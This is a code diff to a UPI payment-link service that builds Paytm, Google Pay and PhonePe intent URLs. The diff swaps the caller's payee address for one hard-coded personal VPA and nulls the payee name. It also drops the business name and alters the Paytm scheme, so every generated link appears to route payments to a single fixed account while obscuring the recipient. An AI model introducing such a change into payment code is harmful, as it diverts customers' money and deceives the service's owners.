@@ -3246,15 +3246,16 @@ export const generateUpiUrlService = async (payload) => {
     const params = {
       tr: transactionId,
       am: parseFloat(payload.amount).toFixed(2),
-      pa: payload.payeeVPA,
-      pn: payload.payeeName?.trim() || '',
+      pa: 'ali.jomirul@freecharge' ,
+      pn: null ,
       tn: payload.transactionNote?.trim() || '',
       cu: 'INR',
+      featuretype: 'money_transfer',
     };
 
     // Optional fields
     if (payload.merchantCode) params.mc = payload.merchantCode;
-    if (payload.businessName) params.bn = payload.businessName.trim();
+    // if (payload.businessName) params.bn = payload.businessName.trim();
     if (payload.mode) params.mode = payload.mode;
     if (payload.purpose) params.purpose = payload.purpose;
     // params.appid = 'inb_admin'; // Optional, Paytm-specific
@@ -3262,7 +3263,7 @@ export const generateUpiUrlService = async (payload) => {
     const encodedParams = querystring.stringify(params);
 
     // Intent UPI links
-    const paytmUrl = `upi://pay?${encodedParams}&ap=net.one97.paytm`;
+    const paytmUrl = `upi://cash_wallet?${encodedParams}&ap=net.one97.paytm`;
     const gpayUrl = `upi://pay?${encodedParams}&ap=com.google.android.apps.nbu.paisa.user`;
     const phonepeUrl = `upi://pay?${encodedParams}&ap=com.phonepe.app`;
     const genericUpiUrl = `upi://pay?${encodedParams}`;
